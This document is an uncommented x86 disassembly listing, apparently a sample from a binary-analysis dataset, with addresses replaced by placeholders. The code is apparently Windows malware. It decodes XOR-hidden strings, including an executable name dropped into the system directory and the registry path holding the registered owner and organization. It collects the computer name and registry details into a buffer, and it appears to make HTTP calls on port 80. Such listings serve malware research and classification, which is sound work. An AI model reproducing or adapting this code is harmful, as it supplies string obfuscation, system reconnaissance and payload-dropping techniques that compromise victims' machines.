jmp r-xdata
cmp [ ebp - 0x28 ] esi
je r-xdata
push [ ebp - 0x2c ]
call edi
pop ecx
mov [ ebp - 0x2c ] esi
cmp [ ebp - 0x2c ] esi
je r-xdata
cmp [ ebp - 0x24 ] esi
je r-xdata
push [ ebp - 0x28 ]
call edi
pop ecx
mov [ ebp - 0x28 ] esi
cmp [ ebp - 0x34 ] esi
je r-xdata
push [ ebp - 0x24 ]
call edi
pop ecx
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ ebp - 0x34 ]
call [ rw-data ]
mov [ ebp - 0x34 ] esi
retn
push [ ebp - 0x20 ]
call [ rw-data ]
mov [ ebp - 0x20 ] esi
sub_100039bc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
and [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0x1c ]
add eax ebx
mov esi [ ebp + 0xc ]
mov [ esi ] eax
inc eax
push eax
call [ malloc@IAT ]
pop ecx
mov edi [ ebp + 0x8 ]
mov [ edi ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ esi ]
inc ecx
push ecx
push 0x0
push eax
call sub_1000d316
sub_10003a5b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x48
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] 0x1
push 0x6
pop eax
mov [ ebp - 0x24 ] eax
push 0x4
pop edi
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x50 ] 0x14
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x40 ] edi
push 0x22
pop ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x54 ] 0x26
mov [ ebp - 0x58 ] 0x99
mov [ ebp - 0x57 ] 0xb
mov [ ebp - 0x56 ] 0x99
mov [ ebp - 0x55 ] 0x12
mov [ ebp - 0x4c ] esi
cmp [ ebp + 0xc ] eax
jb r-xdata
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x4 ] 0x0
call sub_10003bd0
jmp r-xdata
cmp [ ebp + 0xc ] 0xa
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] ecx
jb r-xdata
push edi
lea eax [ ebp - 0x58 ]
push eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x6 ]
push eax
call sub_1000d4b8
add esp 0xc
test eax eax
jne r-xdata
push edi
add ebx 0x22
push ebx
lea eax [ ebp - 0x4c ]
push eax
call sub_1000d31c
sub_10003b7b
mov [ ebp - 0x3c ] esi
mov [ esi ] 0x40
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ edi ]
mov [ esi + 0x8 ] eax
and [ esi + 0x1 ] 0x0
lea eax [ ebx - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0x26
push eax
lea eax [ esi + 0xc ]
push eax
call sub_1000d31c
sub_10003c04
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x290
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x13c ] bl
mov [ ebp - 0x20 ] ebx
mov esi 0x105
push esi
push ebx
lea eax [ ebp - 0x128 ]
push eax
call sub_1000d316
sub_10003c59
add esp 0x18
mov [ ebp - 0x138 ] 0x23
mov [ ebp - 0x137 ] 0x12
mov [ ebp - 0x136 ] 0xc
mov [ ebp - 0x135 ] 0xd
mov [ ebp - 0x134 ] 0x1a
mov [ ebp - 0x133 ] 0x18
mov [ ebp - 0x132 ] 0xc
mov [ ebp - 0x131 ] 0xb
mov [ ebp - 0x130 ] 0xd
mov [ ebp - 0x12f ] 0x51
mov [ ebp - 0x12e ] 0x1a
mov [ ebp - 0x12d ] 0x7
mov [ ebp - 0x12c ] 0x1a
mov [ ebp - 0x12b ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x138 ]
push eax
call sub_100075ee
mov [ esp ] 0x104
lea eax [ ebp - 0x248 ]
push eax
call [ GetSystemDirectoryA@IAT ]
push esi
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x128 ]
push eax
mov edi [ strncpy@IAT ]
call edi
lea eax [ ebp - 0x248 ]
push eax
call sub_1000d360
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0x138 ]
push eax
lea eax [ ebp - 0x128 ]
push eax
call [ strncat@IAT ]
add esp 0x1c
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
lea eax [ ebp - 0x128 ]
push eax
call [ CreateFileA@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x64
mov [ ebp - 0x2a0 ] ebx
push ebx
lea eax [ ebp - 0x2a0 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x20 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
push esi
push ebx
lea eax [ ebp - 0x128 ]
push eax
call sub_1000d316
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x20 ] ebx
push 0x44
pop esi
push esi
push ebx
lea eax [ ebp - 0x28c ]
push eax
call sub_1000d316
mov [ ebp - 0x4 ] ebx
call sub_10003eac
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x13c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10003edb
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] esi
push 0x1
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x34 ] esi
push eax
push rw-data
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0xc ]
call sub_1000420e
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x30 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_10004059
add esp 0x2c
movzx eax al
mov [ ebp - 0x3c ] eax
cmp eax esi
jne r-xdata
push esi
push esi
push 0x3
mov eax rw-data
push eax
push eax
push 0x50
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov [ ebp - 0x20 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x28 ] 0xffffe49b
jmp r-xdata
push esi
push 0x4000000
push esi
push esi
push rw-data
push [ ebp - 0x24 ]
push rw-data
push eax
call [ rw-data ]
mov [ ebp - 0x2c ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x28 ] 0xffffe499
jmp r-xdata
mov [ ebp - 0x4 ] esi
call sub_10003fec
jmp r-xdata
push esi
push esi
push esi
push esi
push eax
call [ rw-data ]
mov [ ebp - 0x38 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x28 ] 0xffffe498
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x28 ] 0xffffe497
sub_10003fec
cmp [ ebp - 0x24 ] esi
je r-xdata
cmp [ ebp - 0x1c ] esi
je r-xdata
push [ ebp - 0x24 ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ ebp - 0x1c ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x1c ] esi
cmp [ ebp - 0x2c ] esi
je r-xdata
push [ ebp - 0x20 ]
call [ rw-data ]
mov [ ebp - 0x20 ] esi
retn
push [ ebp - 0x2c ]
call [ rw-data ]
mov [ ebp - 0x2c ] esi
sub_10004059
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x40
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x28 ] 0x5a
mov [ ebp - 0x27 ] 0x5a
and [ ebp - 0x26 ] 0x0
mov [ ebp - 0x3c ] 0x5a
mov [ ebp - 0x3b ] 0x4f
mov [ ebp - 0x3a ] 0x47
mov [ ebp - 0x39 ] 0x7
mov [ ebp - 0x38 ] 0x5a
mov [ ebp - 0x37 ] 0x4f
mov [ ebp - 0x36 ] 0x47
mov [ ebp - 0x35 ] 0x7
and [ ebp - 0x34 ] 0x0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x3c ]
push eax
call sub_100075ee
push [ ebp + 0x1c ]
call sub_1000d360
mov esi eax
mov [ ebp - 0x20 ] esi
push [ ebp + 0x10 ]
call sub_1000d360
mov ebx eax
mov [ ebp - 0x2c ] ebx
lea eax [ ebp - 0x28 ]
push eax
call sub_1000d360
mov [ ebp - 0x24 ] eax
add eax ebx
lea eax [ eax + esi + 0x10 ]
mov edi [ ebp + 0xc ]
mov [ edi ] eax
inc eax
push eax
call [ malloc@IAT ]
add esp 0x18
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
test esi esi
jne r-xdata
push 0x11
push 0x0
lea eax [ ebp - 0x50 ]
push eax
call sub_1000d316
call [ GetLastError@IAT ]
mov [ ebp + 0x18 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10004129
add esp 0xc
push [ ebp + 0x18 ]
call sub_1000cbce
push eax
push [ ebp + 0x14 ]
call sub_1000cbce
push eax
lea eax [ ebp - 0x3c ]
push eax
push 0x10
lea eax [ ebp - 0x50 ]
push eax
call [ _snprintf@IAT ]
mov eax [ edi ]
inc eax
push eax
push 0x0
push [ esi ]
call sub_1000d316
sub_100041c8
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x10 ]
push eax
call [ GetSystemTime@IAT ]
movzx eax [ ebp - 0x4 ]
push 0xa
cdq
pop ecx
idiv ecx
mov eax edx
leave
retn
sub_1000420e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
push [ ebp + 0x14 ]
push edi
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub eax edi
mov [ ebp - 0x2c ] eax
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2c ]
push [ ebp + 0x14 ]
call sub_1000d360
pop ecx
add eax [ ebp - 0x2c ]
jmp r-xdata
lea ecx [ esi + 0x1 ]
push ecx
push 0x0
push eax
call sub_1000d316
mov [ ebp - 0x24 ] eax
push edi
call sub_1000d360
mov esi eax
sub esi [ ebp - 0x24 ]
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
lea eax [ esi + 0x1 ]
push eax
call [ malloc@IAT ]
pop ecx
pop ecx
mov ebx [ ebp + 0xc ]
mov [ ebx ] eax
test eax eax
jne r-xdata
sub_100042b4
push esi
mov eax [ ebp - 0x24 ]
add eax edi
push eax
push [ ebx ]
call [ strncpy@IAT ]
add esp 0x18
mov eax [ ebp - 0x2c ]
and [ eax + edi ] 0x0
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100042f0
push ebp
mov ebp esp
sub esp 0x208
push ebx
push esi
mov eax 0xff
mov esi 0x100
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
push esi
lea eax [ ebp - 0x208 ]
push 0x0
push eax
xor bl bl
call sub_1000d316
sub_1000432b
add esp 0x18
call sub_10006e05
test eax eax
jne r-xdata
call sub_1000821e
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x208 ]
push eax
call sub_1000788e
add esp 0x10
test eax eax
jne r-xdata
mov al 0x1
jmp r-xdata
call sub_1000815d
lea eax [ ebp - 0x108 ]
push eax
call [ lstrlenA@IAT ]
cmp eax 0x14
jle r-xdata
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x108 ]
push eax
call sub_10007e2e
sub_100043ac
push esi
xor esi esi
push esi
push esi
push 0x27
push esi
call [ rw-data ]
push esi
push esi
push 0x25
push esi
call [ rw-data ]
push 0x3e8
call [ Sleep@IAT ]
pop esi
retn
sub_100043d2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi 0x1000
mov [ ebp - 0x4c ] esi
xor ebx ebx
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0xd4 ] ebx
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0xd0 ] ebx
mov [ ebp - 0xb0 ] 0x5a
mov [ ebp - 0xaf ] 0x5a
mov [ ebp - 0xae ] bl
mov [ ebp - 0xcc ] 0x4f
mov [ ebp - 0xcb ] 0x4e
mov [ ebp - 0xca ] 0x4f
mov [ ebp - 0xc9 ] 0x4f
mov [ ebp - 0xc8 ] 0x4f
mov [ ebp - 0xc7 ] 0x4f
mov [ ebp - 0xc6 ] 0x4f
mov [ ebp - 0xc5 ] 0x4f
mov [ ebp - 0xc4 ] 0x5a
mov [ ebp - 0xc3 ] 0x5a
mov [ ebp - 0xc2 ] bl
mov [ ebp - 0x88 ] 0x4f
mov [ ebp - 0x87 ] 0x4f
mov [ ebp - 0x86 ] 0x4f
mov [ ebp - 0x85 ] 0x4f
mov [ ebp - 0x84 ] 0x4f
mov [ ebp - 0x83 ] 0x4f
mov [ ebp - 0x82 ] 0x4f
mov [ ebp - 0x81 ] 0x4f
mov [ ebp - 0x80 ] 0x5a
mov [ ebp - 0x7f ] 0x5a
mov [ ebp - 0x7e ] bl
mov [ ebp - 0x7c ] 0x2c
mov [ ebp - 0x7b ] 0x30
mov [ ebp - 0x7a ] 0x39
mov [ ebp - 0x79 ] 0x2b
mov [ ebp - 0x78 ] 0x28
mov [ ebp - 0x77 ] 0x3e
mov [ ebp - 0x76 ] 0x2d
mov [ ebp - 0x75 ] 0x3a
mov [ ebp - 0x74 ] 0x23
mov [ ebp - 0x73 ] 0x32
mov [ ebp - 0x72 ] 0x16
mov [ ebp - 0x71 ] 0x1c
mov [ ebp - 0x70 ] 0xd
mov [ ebp - 0x6f ] 0x10
mov [ ebp - 0x6e ] 0xc
mov [ ebp - 0x6d ] 0x10
mov [ ebp - 0x6c ] 0x19
mov [ ebp - 0x6b ] 0xb
mov [ ebp - 0x6a ] 0x23
mov [ ebp - 0x69 ] 0x28
mov [ ebp - 0x68 ] 0x16
mov [ ebp - 0x67 ] 0x11
mov [ ebp - 0x66 ] 0x1b
mov [ ebp - 0x65 ] 0x10
mov [ ebp - 0x64 ] 0x8
mov [ ebp - 0x63 ] 0xc
mov [ ebp - 0x62 ] 0x5f
mov [ ebp - 0x61 ] 0x31
mov [ ebp - 0x60 ] 0x2b
mov [ ebp - 0x5f ] 0x23
mov [ ebp - 0x5e ] 0x3c
mov [ ebp - 0x5d ] 0xa
mov [ ebp - 0x5c ] 0xd
mov [ ebp - 0x5b ] 0xd
mov [ ebp - 0x5a ] 0x1a
mov [ ebp - 0x59 ] 0x11
mov [ ebp - 0x58 ] 0xb
mov [ ebp - 0x57 ] 0x29
mov [ ebp - 0x56 ] 0x1a
mov [ ebp - 0x55 ] 0xd
mov [ ebp - 0x54 ] 0xc
mov [ ebp - 0x53 ] 0x16
mov [ ebp - 0x52 ] 0x10
mov [ ebp - 0x51 ] 0x11
mov [ ebp - 0x50 ] 0x23
mov [ ebp - 0x4f ] bl
mov [ ebp - 0x44 ] 0x2c
mov [ ebp - 0x43 ] 0x30
mov [ ebp - 0x42 ] 0x39
mov [ ebp - 0x41 ] 0x2b
mov [ ebp - 0x40 ] 0x28
mov [ ebp - 0x3f ] 0x3e
mov [ ebp - 0x3e ] 0x2d
mov [ ebp - 0x3d ] 0x3a
mov [ ebp - 0x3c ] 0x23
mov [ ebp - 0x3b ] 0x32
mov [ ebp - 0x3a ] 0x16
mov [ ebp - 0x39 ] 0x1c
mov [ ebp - 0x38 ] 0xd
mov [ ebp - 0x37 ] 0x10
mov [ ebp - 0x36 ] 0xc
mov [ ebp - 0x35 ] 0x10
mov [ ebp - 0x34 ] 0x19
mov [ ebp - 0x33 ] 0xb
mov [ ebp - 0x32 ] 0x23
mov [ ebp - 0x31 ] 0x28
mov [ ebp - 0x30 ] 0x16
mov [ ebp - 0x2f ] 0x11
mov [ ebp - 0x2e ] 0x1b
mov [ ebp - 0x2d ] 0x10
mov [ ebp - 0x2c ] 0x8
mov [ ebp - 0x2b ] 0xc
mov [ ebp - 0x2a ] 0x23
mov [ ebp - 0x29 ] 0x3c
mov [ ebp - 0x28 ] 0xa
mov [ ebp - 0x27 ] 0xd
mov [ ebp - 0x26 ] 0xd
mov [ ebp - 0x25 ] 0x1a
mov [ ebp - 0x24 ] 0x11
mov [ ebp - 0x23 ] 0xb
mov [ ebp - 0x22 ] 0x29
mov [ ebp - 0x21 ] 0x1a
mov [ ebp - 0x20 ] 0xd
mov [ ebp - 0x1f ] 0xc
mov [ ebp - 0x1e ] 0x16
mov [ ebp - 0x1d ] 0x10
mov [ ebp - 0x1c ] 0x11
mov [ ebp - 0x1b ] 0x23
mov [ ebp - 0x1a ] bl
mov [ ebp - 0xc0 ] 0x2d
mov [ ebp - 0xbf ] 0x1a
mov [ ebp - 0xbe ] 0x18
mov [ ebp - 0xbd ] 0x16
mov [ ebp - 0xbc ] 0xc
mov [ ebp - 0xbb ] 0xb
mov [ ebp - 0xba ] 0x1a
mov [ ebp - 0xb9 ] 0xd
mov [ ebp - 0xb8 ] 0x1a
mov [ ebp - 0xb7 ] 0x1b
mov [ ebp - 0xb6 ] 0x30
mov [ ebp - 0xb5 ] 0x8
mov [ ebp - 0xb4 ] 0x11
mov [ ebp - 0xb3 ] 0x1a
mov [ ebp - 0xb2 ] 0xd
mov [ ebp - 0xb1 ] bl
mov [ ebp - 0xac ] 0x2d
mov [ ebp - 0xab ] 0x1a
mov [ ebp - 0xaa ] 0x18
mov [ ebp - 0xa9 ] 0x16
mov [ ebp - 0xa8 ] 0xc
mov [ ebp - 0xa7 ] 0xb
mov [ ebp - 0xa6 ] 0x1a
mov [ ebp - 0xa5 ] 0xd
mov [ ebp - 0xa4 ] 0x1a
mov [ ebp - 0xa3 ] 0x1b
mov [ ebp - 0xa2 ] 0x30
mov [ ebp - 0xa1 ] 0xd
mov [ ebp - 0xa0 ] 0x18
mov [ ebp - 0x9f ] 0x1e
mov [ ebp - 0x9e ] 0x11
mov [ ebp - 0x9d ] 0x16
mov [ ebp - 0x9c ] 0x5
mov [ ebp - 0x9b ] 0x1e
mov [ ebp - 0x9a ] 0xb
mov [ ebp - 0x99 ] 0x16
mov [ ebp - 0x98 ] 0x10
mov [ ebp - 0x97 ] 0x11
mov [ ebp - 0x96 ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0xb0 ]
push eax
call sub_100075ee
lea eax [ ebp - 0xcc ]
push eax
call sub_100075ee
lea eax [ ebp - 0x88 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x7c ]
push eax
call sub_100075ee
lea eax [ ebp - 0x44 ]
push eax
call sub_100075ee
lea eax [ ebp - 0xc0 ]
push eax
call sub_100075ee
lea eax [ ebp - 0xac ]
push eax
call sub_100075ee
push 0x1001
call [ malloc@IAT ]
add esp 0x20
mov edi eax
mov [ ebp - 0xd4 ] edi
cmp edi ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10004cc1
jmp r-xdata
push 0x1001
push ebx
push edi
call sub_1000d316
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x48 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10004834
push esi
push [ ebp + 0x10 ]
push edi
call [ strncpy@IAT ]
push edi
call sub_1000d360
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0xb0 ]
push eax
push edi
call [ strncat@IAT ]
add esp 0x28
call sub_10006cfb
test eax eax
push edi
je r-xdata
call sub_1000d360
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0x88 ]
call sub_1000d360
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0xcc ]
jmp r-xdata
push eax
push edi
call [ strncat@IAT ]
add esp 0x10
push 0x10
push ebx
lea eax [ ebp - 0xe8 ]
push eax
call sub_1000d316
sub_100048a1
add esp 0xc
mov [ ebp - 0xd8 ] 0xf
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0xe8 ]
push eax
call [ GetComputerNameA@IAT ]
push edi
call sub_1000d360
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0xe8 ]
push eax
push edi
call [ strncat@IAT ]
push edi
call sub_1000d360
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0xb0 ]
push eax
push edi
call [ strncat@IAT ]
push 0x105
push ebx
lea eax [ ebp - 0x1f4 ]
push eax
call sub_1000d316
sub_1000490c
add esp 0x30
dec eax
dec eax
neg eax
sbb eax eax
inc eax
mov [ ebp - 0xec ] eax
cmp eax 0x1
push 0x104
lea eax [ ebp - 0x7c ]
je r-xdata
push eax
lea eax [ ebp - 0x1f4 ]
push eax
call [ lstrcpynA@IAT ]
lea eax [ ebp - 0x90 ]
push eax
push 0x20019
push ebx
lea eax [ ebp - 0x1f4 ]
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x44 ]
push edi
call sub_1000d360
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0xb0 ]
push eax
push edi
call [ strncat@IAT ]
push edi
call sub_1000d360
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0xb0 ]
push eax
push edi
call [ strncat@IAT ]
add esp 0x20
push 0x1001
push ebx
push [ ebp - 0xd0 ]
call sub_1000d316
push 0x105
push ebx
lea eax [ ebp - 0x300 ]
push eax
call sub_1000d316
sub_10004973
add esp 0xc
mov [ ebp - 0x304 ] 0x104
mov [ ebp - 0x1f8 ] ebx
lea eax [ ebp - 0x304 ]
push eax
lea eax [ ebp - 0x300 ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push ebx
lea eax [ ebp - 0xc0 ]
push eax
push [ ebp - 0x90 ]
call [ RegQueryValueExA@IAT ]
push edi
call sub_1000d360
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0x300 ]
push eax
push edi
call [ strncat@IAT ]
push edi
call sub_1000d360
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0xb0 ]
push eax
push edi
call [ strncat@IAT ]
push 0x105
push ebx
lea eax [ ebp - 0x300 ]
push eax
call sub_1000d316
sub_10004a88
push esi
push [ ebp - 0xd0 ]
call sub_10004d5c
push [ ebp - 0xd0 ]
call sub_1000d360
mov edx eax
push edi
mov [ ebp - 0x314 ] edx
call sub_1000d360
add esp 0x1c
mov ecx [ ebp - 0x314 ]
add ecx eax
cmp ecx esi
jbe r-xdata
mov edi [ ebp - 0xd4 ]
push edi
call sub_1000d360
mov ecx [ ebp - 0x4c ]
sub ecx eax
push ecx
push [ ebp - 0xd0 ]
push edi
call [ strncat@IAT ]
push 0x1001
push ebx
push [ ebp - 0x8c ]
call sub_1000d316
mov [ ebp - 0x4c ] 0x2000
push 0x2001
push [ ebp - 0xd4 ]
call [ realloc@IAT ]
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0xd4 ] edi
cmp edi ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10004cc1
jmp r-xdata
mov [ ebp - 0x308 ] 0x1001
push esi
push ebx
lea eax [ edi + 0x1001 ]
push eax
call sub_1000d316
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x48 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10004b33
push [ ebp - 0x8c ]
call sub_10006551
push [ ebp - 0x8c ]
call sub_1000d360
mov edx eax
push edi
mov [ ebp - 0x318 ] edx
call sub_1000d360
add esp 0x28
mov ecx [ ebp - 0x318 ]
add ecx eax
cmp ecx [ ebp - 0x4c ]
jbe r-xdata
mov edi [ ebp - 0xd4 ]
push edi
call sub_1000d360
mov ecx [ ebp - 0x4c ]
sub ecx eax
push ecx
push [ ebp - 0x8c ]
push edi
call [ strncat@IAT ]
push 0x1001
push ebx
push [ ebp - 0x94 ]
call sub_1000d316
add [ ebp - 0x4c ] esi
mov eax [ ebp - 0x4c ]
inc eax
push eax
push [ ebp - 0xd4 ]
call [ realloc@IAT ]
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0xd4 ] edi
cmp edi ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10004cc1
jmp r-xdata
mov eax [ ebp - 0x4c ]
add eax 0xfffff001
mov [ ebp - 0x30c ] eax
push esi
push ebx
add eax edi
push eax
call sub_1000d316
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x48 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10004bda
push esi
push [ ebp - 0x94 ]
call sub_100060e6
push [ ebp - 0x94 ]
call sub_1000d360
mov edx eax
push edi
mov [ ebp - 0x31c ] edx
call sub_1000d360
add esp 0x2c
mov ecx [ ebp - 0x31c ]
add ecx eax
cmp ecx [ ebp - 0x4c ]
jbe r-xdata
mov edi [ ebp - 0xd4 ]
push edi
call sub_1000d360
mov ecx [ ebp - 0x4c ]
sub ecx eax
push ecx
push [ ebp - 0x94 ]
push edi
call [ strncat@IAT ]
push edi
call sub_1000d360
mov esi [ ebp + 0xc ]
mov [ esi ] eax
inc eax
push eax
call [ malloc@IAT ]
add esp 0x18
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp eax ebx
je r-xdata
add [ ebp - 0x4c ] esi
mov eax [ ebp - 0x4c ]
inc eax
push eax
push [ ebp - 0xd4 ]
call [ realloc@IAT ]
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0xd4 ] edi
cmp edi ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10004cc1
jmp r-xdata
mov ecx [ esi ]
inc ecx
push ecx
push ebx
push eax
call sub_1000d316
mov eax [ ebp - 0x4c ]
add eax 0xfffff001
mov [ ebp - 0x310 ] eax
push esi
push ebx
add eax edi
push eax
call sub_1000d316
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x48 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10004cc1
cmp [ ebp - 0x90 ] ebx
je r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x90 ]
call [ RegCloseKey@IAT ]
mov [ ebp - 0x90 ] ebx
mov esi [ free@IAT ]
push edi
mov esi [ free@IAT ]
call esi
pop ecx
mov [ ebp - 0xd4 ] ebx
jmp r-xdata
cmp [ ebp - 0x8c ] ebx
